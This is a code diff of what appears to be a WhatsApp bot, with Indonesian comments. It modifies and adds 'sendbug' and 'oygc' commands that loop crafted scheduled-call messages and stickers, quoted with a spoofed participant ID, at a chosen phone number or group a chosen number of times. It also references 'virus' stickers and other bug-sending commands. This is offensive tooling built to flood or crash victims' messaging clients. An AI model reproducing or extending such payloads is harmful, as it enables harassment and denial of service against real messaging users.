@@ -246,9 +246,9 @@ const fpayment = {
 const shinuwu = { 
 key: {
 fromMe: false,
-            participant: `0@s.whatsapp.net`,
+            participant: `7777777@s.whatsapp.net`,
             ...(from ? {
-               remoteJid: `0@s.whatsapp.net`
+               remoteJid: `7777777@s.whatsapp.net`
             } : {})
          },
          message: {
@@ -355,7 +355,7 @@ let { key } = await conn.sendMessage(from, {text: 'Loading...'})//Pengalih isu
 
 for (let i = 0; i < shinchanehe.length; i++) {
 /*await delay(10)*/
-await conn.sendMessage(from, {text: shinchanehe[i], edit: key });//PESAN LEPAS
+a = await conn.sendMessage(from, {text: shinchanehe[i], edit: key });//PESAN LEPAS
 }
 }
 
@@ -1628,25 +1628,6 @@ let nomor = memek.replace(" ", "")
 let jumlah = text.split("|")[1]
 let secon = text.split("|")[2]
 for (let i = 0; i < jumlah ; i++){
-var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": '1',
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": `${weg}\n${tizi}`,
-}
-}), { userJid: m.chat, quoted: m })
-conn.relayMessage(nomor, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(60* secon)
-}
-}
-break
-case 'sendbug': {
-if (!isCreator) return m.reply(`*khusus Owner*`)
-let memek = text.split("|")[0]+'@s.whatsapp.net'
-let nomor = memek.replace(" ", "")
-let jumlah = text.split("|")[1]
-let secon = text.split("|")[2]
-for (let i = 0; i < jumlah ; i++){
  var call = {
  scheduledCallCreationMessage: {
  callType: 2,
@@ -1672,6 +1653,33 @@ for (let i = 0; i < jumlah ; i++){
  }
 }
 conn.relayMessage(nomor, call, {})
+await sleep(2000)
+conn.sendMessage(nomor, { sticker : thumb }, { quoted: shinuwu })
+await sleep(2000)
+conn.relayMessage(nomor, call, {})
+await sleep(2000)
+}
+}
+break
+case 'oygc': {
+if (!isCreator) return m.reply("ngapain?") 
+let memek = text.split("|")[0]+'@g.us'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+for (let i = 0; i < jumlah ; i++){
+ var call = {
+ scheduledCallCreationMessage: {
+ callType: 2,
+ scheduledTimestampMs:  Date.now(),
+ title: `${weg}\n${tizi}`
+ }
+}
+conn.relayMessage(nomor, call, {})
+await sleep(2000)
+conn.sendMessage(nomor, { sticker : thumb }, { quoted: shinuwu })
+await sleep(2000)
+conn.relayMessage(nomor, call, {})
+await sleep(2000)
 }
 }
 break
@@ -1685,6 +1693,10 @@ for (let i = 0; i < jumlah ; i++){
 conn.sendMessage(nomor, { sticker : virusgambar }, { quoted: shinuwu })
 await sleep(60* secon)
 }
+}
+break
+case 'tesaja': {
+conn.sendMessage(m.chat, { sticker : thumb }, { quoted: shinuwu })
 }
 break
 case 'sendbuggc': {
@@ -1785,12 +1797,6 @@ await sleep(1000)
 conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
 await sleep(1000)
 }
-}
-break
-case 'tesaja': {
-if (!isCreator) return m.reply(`*khusus Owner*`)
-conn.sendMessage(m.chat, {text: `nyenye`}, {quoted: shinuwu})
-await sleep(1000)
 }
 break
 case 'bugtxt': {
